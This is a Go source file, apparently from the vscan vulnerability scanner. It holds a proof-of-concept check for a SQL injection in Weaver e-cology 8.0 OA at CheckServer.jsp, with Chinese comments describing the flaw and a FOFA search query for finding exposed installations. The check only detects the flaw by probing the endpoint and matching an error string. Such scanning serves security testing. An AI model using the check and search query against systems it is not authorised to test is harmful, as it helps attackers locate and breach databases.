package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//## 漏洞类型
//
//SQL注入
//
//## 简介
//
//泛微新一代移动办公平台e-cology8.0不仅组织提供了一体化的协同工作平台,将组织事务逐渐实现全程电子化,改变传统纸质文件、实体签章的方式。泛微OA E-Cology v8.0平台CheckServer.jsp处存在SQL注入漏洞，攻击者通过漏洞可以获取数据库权限。
//
//## 搜索语法
//
//fofa：`app="泛微-协同办公OA"`
//
//## POC

func CheckServer_sql(u string) bool {

	if req, err := pkg.HttpRequset(u+"/mobile/plugin/CheckServer.jsp?type=mobileSetting", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "error") && strings.Contains(req.Body, "system error") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln weaver SQL注入-CheckServer-sql!|%s\n", u+"/mobile/plugin/CheckServer.jsp?type=mobileSetting"))
			return true

		}
	}
	return false
}
